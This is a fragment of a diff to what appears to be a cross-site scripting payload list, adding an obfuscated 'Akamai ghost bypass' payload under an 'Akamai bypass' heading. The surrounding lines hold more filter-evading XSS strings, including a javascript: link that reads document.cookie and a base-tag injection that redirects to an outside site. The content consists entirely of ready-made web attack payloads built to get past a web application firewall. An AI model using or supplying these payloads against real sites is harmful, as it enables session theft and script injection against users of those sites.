@@ -35,6 +35,7 @@ d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]
 
 **Akamai bypass**
 ```
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x> //akamai ghost bypass
 <d3v/onauxclick=[2].some(confirm)>click
 <a href="javascript:pro\u006dpt(document.cookie)">L1k0r</a>
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
